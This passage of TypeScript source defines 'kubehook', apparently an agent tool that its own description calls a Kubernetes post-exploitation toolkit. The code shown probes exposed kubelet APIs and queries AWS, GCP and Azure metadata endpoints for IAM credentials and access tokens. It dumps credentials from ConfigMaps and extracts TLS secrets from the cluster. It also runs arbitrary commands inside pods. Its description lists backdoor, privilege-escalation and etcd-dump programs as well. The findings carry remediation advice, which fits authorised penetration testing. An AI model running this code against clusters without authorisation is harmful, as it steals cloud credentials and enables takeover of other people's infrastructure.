      const pods = await run("curl", ["-s", "--max-time", "5", `${base}/pods`], timeout)
      if (pods.exitCode === 0 && pods.stdout.includes('"items"')) {
        const data = tryJson(pods.stdout)
        const items = data?.items || []
        output.push(`[+] Kubelet read-only API OPEN on ${target}:${p}!`)
        output.push(`    Pods: ${items.length}`)
        for (const pod of items.slice(0, 10)) {
          output.push(`    ${pod.metadata?.namespace}/${pod.metadata?.name} (${pod.status?.phase})`)
        }
        findings.push({
          checkId: "K8S-KUBELET-001",
          provider: "kubernetes",
          severity: "high",
          status: "FAIL",
          resource: `kubelet://${target}:${p}`,
          title: `Kubelet read-only API exposed: ${target}:${p}`,
          details: `${items.length} pod(s) accessible without authentication`,
          remediation: "Disable read-only port (--read-only-port=0)",
        })
      }
      continue
    }

    const pods = await run("curl", ["-sk", "--max-time", "5", `${base}/pods`], timeout)
    if (pods.exitCode === 0 && pods.stdout.includes('"items"')) {
      const data = tryJson(pods.stdout)
      const items = data?.items || []
      output.push(`[+] Kubelet API accessible without client cert on ${target}:${p}!`)
      output.push(`    Pods: ${items.length}`)
      findings.push({
        checkId: "K8S-KUBELET-002",
        provider: "kubernetes",
        severity: "critical",
        status: "FAIL",
        resource: `kubelet://${target}:${p}`,
        title: `Kubelet API unauthenticated: ${target}:${p}`,
        details: `Full kubelet API including exec/run accessible — can execute commands in any pod`,
        remediation: "Enable kubelet authentication (--authentication-token-webhook=true)",
      })

      const running = await run("curl", ["-sk", "--max-time", "5", `${base}/runningpods/`], timeout)
      if (running.exitCode === 0) {
        const runData = tryJson(running.stdout)
        const runItems = runData?.items || []
        output.push(`    Running pods: ${runItems.length}`)
        for (const pod of runItems.slice(0, 10)) {
          const containers = (pod.spec?.containers || []).map((c: Record<string, string>) => c.name)
          output.push(`      ${pod.metadata?.namespace}/${pod.metadata?.name} — ${containers.join(",")}`)
        }
      }
    }
    if (pods.exitCode !== 0 || pods.stdout.includes("Forbidden") || pods.stdout.includes("Unauthorized")) {
      output.push(`[-] Kubelet API on ${target}:${p} requires authentication (good)`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function cloudMetadata(_args: string[], timeout: number): Promise<HookResult> {
  const provider = argVal(_args, "--provider") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Probing cloud metadata services from pod...\n"]

  if (provider === "aws" || provider === "all") {
    output.push("\n── AWS IMDS ──")
    const tokenReq = await run(
      "curl",
      [
        "-s",
        "--max-time",
        "3",
        "-X",
        "PUT",
        "-H",
        "X-aws-ec2-metadata-token-ttl-seconds: 60",
        "http://169.254.169.254/latest/api/token",
      ],
      timeout,
    )
    const token = tokenReq.exitCode === 0 ? tokenReq.stdout.trim() : ""
    const headers = token ? ["-H", `X-aws-ec2-metadata-token: ${token}`] : []

    const identity = await run(
      "curl",
      ["-s", "--max-time", "3", ...headers, "http://169.254.169.254/latest/meta-data/iam/info"],
      timeout,
    )
    if (identity.exitCode === 0 && identity.stdout.includes("InstanceProfileArn")) {
      const info = tryJson(identity.stdout)
      output.push(`[+] AWS IMDS accessible! IAM Role: ${info?.InstanceProfileArn || "unknown"}`)

      const creds = await run(
        "curl",
        ["-s", "--max-time", "3", ...headers, "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
        timeout,
      )
      if (creds.exitCode === 0 && creds.stdout.trim()) {
        const roleName = creds.stdout.trim().split("\n")[0]
        const roleCredReq = await run(
          "curl",
          [
            "-s",
            "--max-time",
            "3",
            ...headers,
            `http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`,
          ],
          timeout,
        )
        if (roleCredReq.exitCode === 0) {
          const rc = tryJson(roleCredReq.stdout)
          if (rc?.AccessKeyId) {
            output.push(`    AccessKeyId: ${rc.AccessKeyId}`)
            output.push(`    SecretAccessKey: ${rc.SecretAccessKey?.substring(0, 10)}...`)
            output.push(`    Token: ${rc.Token?.substring(0, 20)}...`)
            output.push(`    Expiration: ${rc.Expiration}`)
          }
        }
      }
      findings.push({
        checkId: "K8S-META-001",
        provider: "kubernetes",
        severity: "critical",
        status: "FAIL",
        resource: "imds://169.254.169.254",
        title: "AWS IMDS accessible from pod",
        details: `IAM Role: ${info?.InstanceProfileArn || "unknown"}`,
        remediation: "Use IRSA (IAM Roles for Service Accounts) and block IMDS with NetworkPolicy",
      })
    }
    if (identity.exitCode !== 0) output.push("[-] AWS IMDS not accessible")
  }

  if (provider === "gcp" || provider === "all") {
    output.push("\n── GCP Metadata ──")
    const meta = await run(
      "curl",
      [
        "-s",
        "--max-time",
        "3",
        "-H",
        "Metadata-Flavor: Google",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
      ],
      timeout,
    )
    if (meta.exitCode === 0 && meta.stdout.includes("@")) {
      output.push(`[+] GCP Metadata accessible! SA: ${meta.stdout.trim()}`)
      const token = await run(
        "curl",
        [
          "-s",
          "--max-time",
          "3",
          "-H",
          "Metadata-Flavor: Google",
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        timeout,
      )
      if (token.exitCode === 0) {
        const t = tryJson(token.stdout)
        if (t?.access_token)
          output.push(`    Token: ${t.access_token.substring(0, 20)}... (expires in ${t.expires_in}s)`)
      }
      findings.push({
        checkId: "K8S-META-001",
        provider: "kubernetes",
        severity: "critical",
        status: "FAIL",
        resource: "imds://metadata.google.internal",
        title: "GCP metadata accessible from pod",
        details: `Service Account: ${meta.stdout.trim()}`,
        remediation: "Use Workload Identity and block metadata with NetworkPolicy",
      })
    }
    if (meta.exitCode !== 0) output.push("[-] GCP metadata not accessible")
  }

  if (provider === "azure" || provider === "all") {
    output.push("\n── Azure IMDS ──")
    const meta = await run(
      "curl",
      [
        "-s",
        "--max-time",
        "3",
        "-H",
        "Metadata: true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      ],
      timeout,
    )
    if (meta.exitCode === 0 && meta.stdout.includes("vmId")) {
      const d = tryJson(meta.stdout)
      output.push(`[+] Azure IMDS accessible!`)
      if (d?.compute) output.push(`    VM: ${d.compute.name}, RG: ${d.compute.resourceGroupName}`)

      const token = await run(
        "curl",
        [
          "-s",
          "--max-time",
          "3",
          "-H",
          "Metadata: true",
          "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        timeout,
      )
      if (token.exitCode === 0) {
        const t = tryJson(token.stdout)
        if (t?.access_token) output.push(`    Token: ${t.access_token.substring(0, 20)}...`)
      }
      findings.push({
        checkId: "K8S-META-001",
        provider: "kubernetes",
        severity: "critical",
        status: "FAIL",
        resource: "imds://169.254.169.254",
        title: "Azure IMDS accessible from pod",
        details: `VM: ${d?.compute?.name || "unknown"}`,
        remediation: "Use Azure AD Workload Identity and block IMDS",
      })
    }
    if (meta.exitCode !== 0) output.push("[-] Azure IMDS not accessible")
  }

  return { output: output.join("\n"), findings }
}

async function k8sConfigmap(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const output: string[] = ["[*] Dumping Kubernetes ConfigMaps...\n"]
  const findings: Finding[] = []

  const secretPattern =
    /(?:password|secret|api[_-]?key|token|credential|private[_-]?key|database[_-]?url|connection[_-]?string|redis|mysql|postgres|mongo|amqp)/i

  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  const namespaces = ns
    ? [ns]
    : nsResult.exitCode === 0
      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
      : ["default"]

  let total = 0
  for (const n of namespaces) {
    const cms = await kc(["get", "configmaps", "-n", n], kubeconfig, ctx, timeout)
    if (cms.exitCode !== 0) continue
    const items = tryJson(cms.stdout)?.items || []
    if (items.length === 0) continue

    for (const cm of items) {
      if (cm.metadata.name.startsWith("kube-")) continue
      const data = cm.data || {}
      const keys = Object.keys(data)
      if (keys.length === 0) continue
      total++

      let hasSecret = false
      for (const [key, val] of Object.entries(data)) {
        const value = String(val)
        if (secretPattern.test(key) || secretPattern.test(value)) {
          if (!hasSecret) {
            output.push(`\n[+] ${n}/${cm.metadata.name}`)
            hasSecret = true
          }
          output.push(`    [!] ${key}: ${value.substring(0, 150)}`)
          findings.push({
            checkId: "K8S-CM-001",
            provider: "kubernetes",
            severity: "high",
            status: "EXTRACTED",
            resource: `${n}/ConfigMap/${cm.metadata.name}`,
            title: `Credential in ConfigMap: ${cm.metadata.name}/${key}`,
            details: `${key}: ${value.substring(0, 200)}`,
            remediation: "Move credentials to Kubernetes Secrets or external secret management",
          })
        }
      }
    }
  }

  output.push(`\n[*] Total ConfigMaps scanned: ${total}, issues: ${findings.length}`)
  return { output: output.join("\n"), findings }
}

async function k8sAdmission(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing admission controllers...\n"]

  const mutating = await kc(["get", "mutatingwebhookconfigurations"], kubeconfig, ctx, timeout)
  if (mutating.exitCode === 0) {
    const items = tryJson(mutating.stdout)?.items || []
    output.push(`[+] Mutating webhooks: ${items.length}`)
    for (const w of items) {
      output.push(`    ${w.metadata.name}`)
      for (const wh of w.webhooks || []) {
        const fail = wh.failurePolicy || "Fail"
        const rules = (wh.rules || [])
          .map((r: Record<string, string[]>) => `${(r.operations || []).join(",")} → ${(r.resources || []).join(",")}`)
          .join("; ")
        output.push(`      ${wh.name} [${fail}] ${rules}`)
        if (fail === "Ignore") {
          findings.push({
            checkId: "K8S-ADM-001",
            provider: "kubernetes",
            severity: "high",
            status: "FAIL",
            resource: `webhook://${w.metadata.name}/${wh.name}`,
            title: `Webhook failurePolicy=Ignore: ${wh.name}`,
            details: "Webhook failures are silently ignored — policy can be bypassed if webhook is unavailable",
            remediation: "Set failurePolicy to Fail for security-critical webhooks",
          })
        }
      }
    }
  }

  const validating = await kc(["get", "validatingwebhookconfigurations"], kubeconfig, ctx, timeout)
  if (validating.exitCode === 0) {
    const items = tryJson(validating.stdout)?.items || []
    output.push(`\n[+] Validating webhooks: ${items.length}`)
    for (const w of items) {
      output.push(`    ${w.metadata.name}`)
      for (const wh of w.webhooks || []) {
        const fail = wh.failurePolicy || "Fail"
        output.push(`      ${wh.name} [${fail}]`)
      }
    }
  }

  const gk = await kc(["get", "constraints", "--all-namespaces"], kubeconfig, ctx, timeout)
  if (gk.exitCode === 0) {
    const items = tryJson(gk.stdout)?.items || []
    if (items.length > 0) {
      output.push(`\n[+] OPA Gatekeeper constraints: ${items.length}`)
      for (const c of items) {
        const violations = c.status?.totalViolations || 0
        const enforcement = c.spec?.enforcementAction || "deny"
        output.push(`    ${c.metadata.name} [${enforcement}] violations: ${violations}`)
        if (enforcement === "dryrun" || enforcement === "warn") {
          findings.push({
            checkId: "K8S-ADM-002",
            provider: "kubernetes",
            severity: "medium",
            status: "FAIL",
            resource: `gatekeeper://${c.metadata.name}`,
            title: `Gatekeeper constraint not enforcing: ${c.metadata.name}`,
            details: `enforcementAction=${enforcement} — violations are not blocked`,
            remediation: "Set enforcementAction to deny for security constraints",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function k8sPodSecurity(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing Pod Security Standards...\n"]

  const nsArgs = ns ? ["-n", ns] : ["--all-namespaces"]
  const namespaces = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
  if (namespaces.exitCode !== 0) return { output: "[-] Cannot list namespaces", findings }

  const items = tryJson(namespaces.stdout)?.items || []
  output.push(`[+] Namespaces: ${items.length}\n`)

  for (const n of items) {
    const name = n.metadata.name
    const labels = n.metadata.labels || {}
    const enforce = labels["pod-security.kubernetes.io/enforce"] || "none"
    const audit = labels["pod-security.kubernetes.io/audit"] || "none"
    const warn = labels["pod-security.kubernetes.io/warn"] || "none"
    output.push(`  ${name}: enforce=${enforce} audit=${audit} warn=${warn}`)

    if (enforce === "none" || enforce === "privileged") {
      findings.push({
        checkId: "K8S-PSS-001",
        provider: "kubernetes",
        severity: enforce === "none" ? "high" : "medium",
        status: "FAIL",
        resource: `namespace/${name}`,
        title: `No PSS enforcement: ${name}`,
        details: `pod-security.kubernetes.io/enforce=${enforce} — pods can run privileged`,
        remediation: "Set enforce label to baseline or restricted",
      })
    }
  }

  const pods = await kc(["get", "pods", ...nsArgs], kubeconfig, ctx, timeout)
  if (pods.exitCode === 0) {
    const podItems = tryJson(pods.stdout)?.items || []
    let privileged = 0
    let hostNetwork = 0
    let hostPid = 0
    for (const p of podItems) {
      const spec = p.spec || {}
      if (spec.hostNetwork) hostNetwork++
      if (spec.hostPID) hostPid++
      for (const c of spec.containers || []) {
        if (c.securityContext?.privileged) privileged++
      }
    }
    output.push(`\n[+] Pod security summary:`)
    output.push(`    Total pods: ${podItems.length}`)
    output.push(`    Privileged containers: ${privileged}`)
    output.push(`    Host network: ${hostNetwork}`)
    output.push(`    Host PID: ${hostPid}`)
  }

  return { output: output.join("\n"), findings }
}

async function k8sServiceAccount(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Analyzing service accounts...\n"]

  const nsArgs = ns ? ["-n", ns] : ["--all-namespaces"]
  const sas = await kc(["get", "serviceaccounts", ...nsArgs], kubeconfig, ctx, timeout)
  if (sas.exitCode !== 0) return { output: "[-] Cannot list service accounts", findings }

  const items = tryJson(sas.stdout)?.items || []
  output.push(`[+] Service accounts: ${items.length}\n`)

  for (const sa of items) {
    const name = sa.metadata.name
    const saNamespace = sa.metadata.namespace
    const autoMount = sa.automountServiceAccountToken !== false
    const secrets = sa.secrets || []

    if (name === "default" && autoMount) {
      findings.push({
        checkId: "K8S-SA-001",
        provider: "kubernetes",
        severity: "medium",
        status: "FAIL",
        resource: `sa/${saNamespace}/${name}`,
        title: `Default SA auto-mounts token: ${saNamespace}`,
        details: "Default service account automounts API token to all pods without explicit SA",
        remediation: "Set automountServiceAccountToken: false on default SA",
      })
    }

    for (const s of secrets) {
      const secret = await kc(["get", "secret", s.name, "-n", saNamespace], kubeconfig, ctx, timeout)
      if (secret.exitCode !== 0) continue
      const data = tryJson(secret.stdout)
      if (!data?.data?.token) continue
      const token = Buffer.from(data.data.token, "base64").toString()
      const parts = token.split(".")
      if (parts.length === 3) {
        const payload = tryJson(Buffer.from(parts[1], "base64").toString())
        if (payload) {
          output.push(`  ${saNamespace}/${name}:`)
          output.push(`    Token subject: ${payload.sub || "?"}`)
          output.push(`    Audience: ${JSON.stringify(payload.aud || "default")}`)
          output.push(`    Expires: ${payload.exp ? new Date(payload.exp * 1000).toISOString() : "never"}`)
        }
      }
    }
  }

  const crbs = await kc(["get", "clusterrolebindings"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    for (const b of items) {
      const role = b.roleRef?.name
      if (role !== "cluster-admin") continue
      for (const s of b.subjects || []) {
        if (s.kind === "ServiceAccount") {
          output.push(`\n  [!] SA with cluster-admin: ${s.namespace}/${s.name}`)
          findings.push({
            checkId: "K8S-SA-002",
            provider: "kubernetes",
            severity: "critical",
            status: "FAIL",
            resource: `sa/${s.namespace}/${s.name}`,
            title: `SA with cluster-admin: ${s.namespace}/${s.name}`,
            details: `ServiceAccount bound to cluster-admin via ${b.metadata.name}`,
            remediation: "Use least-privilege roles instead of cluster-admin",
          })
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

async function k8sIngressAudit(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Auditing Ingress resources...\n"]

  const nsArgs = ns ? ["-n", ns] : ["--all-namespaces"]
  const ingress = await kc(["get", "ingress", ...nsArgs], kubeconfig, ctx, timeout)
  if (ingress.exitCode !== 0) return { output: "[-] Cannot list ingress resources", findings }

  const items = tryJson(ingress.stdout)?.items || []
  output.push(`[+] Ingress resources: ${items.length}\n`)

  for (const ing of items) {
    const name = ing.metadata.name
    const ingNs = ing.metadata.namespace
    const annotations = ing.metadata.annotations || {}
    output.push(`── ${ingNs}/${name} ──`)

    const tls = ing.spec.tls || []
    if (tls.length === 0) {
      output.push(`    [!] No TLS configured — HTTP only`)
      findings.push({
        checkId: "K8S-ING-001",
        provider: "kubernetes",
        severity: "high",
        status: "FAIL",
        resource: `ingress/${ingNs}/${name}`,
        title: `No TLS on ingress: ${name}`,
        details: "Traffic is unencrypted",
        remediation: "Add TLS configuration with a valid certificate",
      })
    }
    for (const t of tls) {
      output.push(`    TLS hosts: ${(t.hosts || []).join(", ")}`)
      output.push(`    Secret: ${t.secretName || "none"}`)
      if (t.secretName) {
        const cert = await kc(["get", "secret", t.secretName, "-n", ingNs], kubeconfig, ctx, timeout)
        if (cert.exitCode === 0) {
          const data = tryJson(cert.stdout)
          if (data?.data?.["tls.crt"]) {
            output.push(`    [+] TLS cert extracted: ${t.secretName}`)
            findings.push({
              checkId: "K8S-ING-002",
              provider: "kubernetes",
              severity: "medium",
              status: "EXTRACTED",
              resource: `secret/${ingNs}/${t.secretName}`,
              title: `TLS certificate extracted: ${t.secretName}`,
              details: `Certificate for hosts: ${(t.hosts || []).join(", ")}`,
              remediation: "Restrict access to TLS secrets",
            })
          }
        }
      }
    }

    for (const rule of ing.spec.rules || []) {
      output.push(`    Host: ${rule.host || "*"}`)
      for (const path of rule.http?.paths || []) {
        const backend = path.backend?.service?.name || path.backend?.serviceName || "?"
        const port = path.backend?.service?.port?.number || path.backend?.servicePort || "?"
        output.push(`      ${path.path || "/"} → ${backend}:${port}`)
      }
    }

    const dangerous = [
      "nginx.ingress.kubernetes.io/server-snippet",
      "nginx.ingress.kubernetes.io/configuration-snippet",
      "nginx.ingress.kubernetes.io/auth-url",
    ]
    for (const key of dangerous) {
      if (annotations[key]) {
        output.push(`    [!] Annotation: ${key}`)
        findings.push({
          checkId: "K8S-ING-003",
          provider: "kubernetes",
          severity: "medium",
          status: "INFO",
          resource: `ingress/${ingNs}/${name}`,
          title: `Potentially dangerous annotation: ${key.split("/").pop()}`,
          details: `Value: ${String(annotations[key]).substring(0, 200)}`,
          remediation: "Review ingress annotations for injection risks",
        })
      }
    }
    output.push("")
  }

  return { output: output.join("\n"), findings }
}

async function k8sPvDump(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Enumerating PersistentVolumes...\n"]

  const pvs = await kc(["get", "pv"], kubeconfig, ctx, timeout)
  if (pvs.exitCode === 0) {
    const items = tryJson(pvs.stdout)?.items || []
    output.push(`[+] PersistentVolumes: ${items.length}\n`)
    for (const pv of items) {
      const name = pv.metadata.name
      const status = pv.status?.phase || "?"
      const capacity = pv.spec?.capacity?.storage || "?"
      const accessModes = (pv.spec?.accessModes || []).join(",")
      output.push(`  ${name} [${status}] ${capacity} (${accessModes})`)

      if (pv.spec?.hostPath) {
        output.push(`    [!] hostPath: ${pv.spec.hostPath.path}`)
        findings.push({
          checkId: "K8S-PV-001",
          provider: "kubernetes",
          severity: "critical",
          status: "FAIL",
          resource: `pv/${name}`,
          title: `hostPath PV: ${name}`,
          details: `PV mounts host path: ${pv.spec.hostPath.path}`,
          remediation: "Avoid hostPath PVs — use CSI drivers or cloud volumes",
        })
      }
      if (pv.spec?.nfs) {
        output.push(`    NFS: ${pv.spec.nfs.server}:${pv.spec.nfs.path}`)
        findings.push({
          checkId: "K8S-PV-002",
          provider: "kubernetes",
          severity: "medium",
          status: "INFO",
          resource: `pv/${name}`,
          title: `NFS PV: ${name}`,
          details: `NFS share: ${pv.spec.nfs.server}:${pv.spec.nfs.path}`,
          remediation: "Secure NFS exports and restrict access",
        })
      }
    }
  }

  const nsArgs = ns ? ["-n", ns] : ["--all-namespaces"]
  const pvcs = await kc(["get", "pvc", ...nsArgs], kubeconfig, ctx, timeout)
  if (pvcs.exitCode === 0) {
    const items = tryJson(pvcs.stdout)?.items || []
    output.push(`\n[+] PersistentVolumeClaims: ${items.length}`)
    for (const pvc of items) {
      const name = pvc.metadata.name
      const pvcNs = pvc.metadata.namespace
      const status = pvc.status?.phase || "?"
      const vol = pvc.spec?.volumeName || "?"
      output.push(`    ${pvcNs}/${name} [${status}] → ${vol}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function k8sEvents(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting Kubernetes events...\n"]

  const nsArgs = ns ? ["-n", ns] : ["--all-namespaces"]
  const events = await kc(["get", "events", "--sort-by=.lastTimestamp", ...nsArgs], kubeconfig, ctx, timeout)
  if (events.exitCode !== 0) return { output: "[-] Cannot list events", findings }

  const items = tryJson(events.stdout)?.items || []
  output.push(`[+] Events: ${items.length}\n`)

  const warnings = items.filter((e: Record<string, string>) => e.type === "Warning")
  const errors = items.filter(
    (e: Record<string, string>) => e.reason === "Failed" || e.reason === "FailedScheduling" || e.reason === "BackOff",
  )
  const security = items.filter((e: Record<string, string>) =>
    /forbidden|unauthorized|denied|auth/i.test(e.message || ""),
  )

  if (security.length > 0) {
    output.push(`[!] Security-related events: ${security.length}`)
    for (const e of security.slice(0, 20)) {
      output.push(
        `    [${e.lastTimestamp || "?"}] ${e.involvedObject?.name || "?"}: ${(e.message || "").substring(0, 150)}`,
      )
    }
    findings.push({
      checkId: "K8S-EVT-001",
      provider: "kubernetes",
      severity: "info",
      status: "ENUMERATED",
      resource: "k8s://events",
      title: `${security.length} security-related events found`,
      details: "Events contain access denied/forbidden messages indicating auth attempts",
      remediation: "Review failed auth attempts for unauthorized access",
    })
  }

  if (warnings.length > 0) {
    output.push(`\n[+] Warning events: ${warnings.length}`)
    for (const e of warnings.slice(0, 20)) {
      output.push(
        `    [${e.lastTimestamp || "?"}] ${e.reason}: ${e.involvedObject?.name || "?"} — ${(e.message || "").substring(0, 150)}`,
      )
    }
  }

  if (errors.length > 0) {
    output.push(`\n[+] Error events: ${errors.length}`)
    for (const e of errors.slice(0, 10)) {
      output.push(`    [${e.lastTimestamp || "?"}] ${e.reason}: ${(e.message || "").substring(0, 150)}`)
    }
  }

  const imagePulls = items.filter(
    (e: Record<string, string>) => e.reason === "Failed" && /pull|image/i.test(e.message || ""),
  )
  if (imagePulls.length > 0) {
    output.push(`\n[+] Image pull failures: ${imagePulls.length}`)
    for (const e of imagePulls.slice(0, 10)) {
      output.push(`    ${e.involvedObject?.name}: ${(e.message || "").substring(0, 200)}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function k8sExec(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const ns = argVal(args, "--namespace") || "default"
  const pod = argVal(args, "--pod")
  const container = argVal(args, "--container")
  const cmd = argVal(args, "--cmd")
  const findings: Finding[] = []
  const output: string[] = ["[*] Kubernetes pod execution...\n"]

  if (!pod || !cmd) {
    output.push(`[*] Listing exec-capable pods in ${ns}...`)
    const pods = await kc(["get", "pods", "-n", ns, "--field-selector=status.phase=Running"], kubeconfig, ctx, timeout)
    if (pods.exitCode !== 0) return { output: "[-] Cannot list pods", findings }
    const items = tryJson(pods.stdout)?.items || []
    output.push(`\n[+] Running pods: ${items.length}\n`)
    for (const p of items) {
      const name = p.metadata.name
      const containers = (p.spec.containers || []).map((c: Record<string, string>) => c.name).join(", ")
      output.push(`    ${name} [${containers}]`)
    }
    if (!pod) output.push(`\n[*] Use --pod POD --cmd CMD to execute a command`)
    return { output: output.join("\n"), findings }
  }

  const containerArgs = container ? ["-c", container] : []
  output.push(`[*] Executing in ${ns}/${pod}: ${cmd}\n`)

  const exec = await kcText(["exec", pod, "-n", ns, ...containerArgs, "--", "sh", "-c", cmd], kubeconfig, ctx, timeout)
  if (exec.exitCode === 0) {
    output.push(`[+] Output:\n${exec.stdout.substring(0, 5000)}`)
    findings.push({
      checkId: "K8S-EXEC-001",
      provider: "kubernetes",
      severity: "high",
      status: "EXECUTED",
      resource: `pod/${ns}/${pod}`,
      title: `Command executed in pod: ${pod}`,
      details: `Command: ${cmd.substring(0, 200)}`,
      remediation: "Restrict exec access via RBAC — remove pods/exec verb",
    })
  }
  if (exec.exitCode !== 0) {
    output.push(`[-] Exec failed (exit ${exec.exitCode}): ${exec.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> {
  const kubeconfig = argVal(args, "--kubeconfig")
  const ctx = argVal(args, "--context")
  const dryRun = args.includes("--dry-run")
  const output: string[] = [
    dryRun
      ? "[*] CLEANUP DRY RUN — no changes will be made\n"
      : "[*] Cleaning up CyberStrike Kubernetes resources...\n",
  ]
  let cleaned = 0

  const resources = ["daemonsets", "cronjobs", "pods", "jobs"]
  for (const res of resources) {
    const list = await kc(["get", res, "--all-namespaces", "-l", "app=cyberstrike"], kubeconfig, ctx, timeout)
    if (list.exitCode !== 0) continue
    const items = tryJson(list.stdout)?.items || []
    for (const item of items) {
      const ns = item.metadata.namespace
      const name = item.metadata.name
      if (dryRun) {
        output.push(`  [DRY] Would delete ${res}/${name} in ${ns}`)
      } else {
        const del = await kcText(["delete", res, name, "-n", ns], kubeconfig, ctx, timeout)
        output.push(
          del.exitCode === 0 ? `  [+] Deleted ${res}/${name} from ${ns}` : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
        )
      }
      cleaned++
    }
  }

  const crbs = await kc(["get", "clusterrolebindings", "-l", "app=cyberstrike"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    for (const b of items) {
      if (dryRun) {
        output.push(`  [DRY] Would delete ClusterRoleBinding/${b.metadata.name}`)
      } else {
        const del = await kcText(["delete", "clusterrolebinding", b.metadata.name], kubeconfig, ctx, timeout)
        output.push(
          del.exitCode === 0
            ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}`
            : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
        )
      }
      cleaned++
    }
  }

  const crbsByName = await kc(["get", "clusterrolebindings"], kubeconfig, ctx, timeout)
  if (crbsByName.exitCode === 0) {
    const items = tryJson(crbsByName.stdout)?.items || []
    for (const b of items) {
      if (!String(b.metadata.name).startsWith("cs-")) continue
      if (dryRun) {
        output.push(`  [DRY] Would delete ClusterRoleBinding/${b.metadata.name} (cs-* prefix)`)
      } else {
        const del = await kcText(["delete", "clusterrolebinding", b.metadata.name], kubeconfig, ctx, timeout)
        output.push(
          del.exitCode === 0
            ? `  [+] Deleted ClusterRoleBinding/${b.metadata.name}`
            : `  [-] Failed: ${del.stderr.slice(0, 100)}`,
        )
      }
      cleaned++
    }
  }

  output.push(`\n[*] Cleanup complete: ${cleaned} resource(s) ${dryRun ? "found" : "removed"}`)
  return { output: output.join("\n"), findings: [] }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const KubehookTool = Tool.define("kubehook", {
  description: `Execute a Kubernetes post-exploitation program. 20 programs: cluster enum, secrets/configmap extraction, escape detection, RBAC audit, admission controller audit, Pod Security Standards, service account analysis, ingress audit, network policy gaps, PV/PVC dump, events extraction, pod exec, Helm secrets, kubelet API, cloud metadata IMDS, privesc, backdoor, etcd dump. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_k8s before leaving.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "Kubernetes program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    if (!Bun.which("kubectl") && !["kubelet_api", "cloud_metadata"].includes(params.program)) {
      return {
        title: `kubehook: ${params.program}`,
        output: "kubectl not found. Install: https://kubernetes.io/docs/tasks/tools/",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      k8s_enum: () => k8sEnum(params.args, params.timeout_seconds),
      k8s_secrets: () => k8sSecrets(params.args, params.timeout_seconds),
      k8s_escape: () => k8sEscape(params.args, params.timeout_seconds),
      k8s_privesc: () => k8sPrivesc(params.args, params.timeout_seconds),
      etcd_dump: () => etcdDump(params.args, params.timeout_seconds),
      k8s_backdoor: () => k8sBackdoor(params.args, params.timeout_seconds),
      k8s_rbac_audit: () => k8sRbacAudit(params.args, params.timeout_seconds),
      k8s_network_policy: () => k8sNetworkPolicy(params.args, params.timeout_seconds),
      helm_secrets: () => helmSecrets(params.args, params.timeout_seconds),
      kubelet_api: () => kubeletApi(params.args, params.timeout_seconds),
      cloud_metadata: () => cloudMetadata(params.args, params.timeout_seconds),
      k8s_configmap: () => k8sConfigmap(params.args, params.timeout_seconds),
      k8s_admission: () => k8sAdmission(params.args, params.timeout_seconds),
      k8s_pod_security: () => k8sPodSecurity(params.args, params.timeout_seconds),
      k8s_service_account: () => k8sServiceAccount(params.args, params.timeout_seconds),
      k8s_ingress_audit: () => k8sIngressAudit(params.args, params.timeout_seconds),
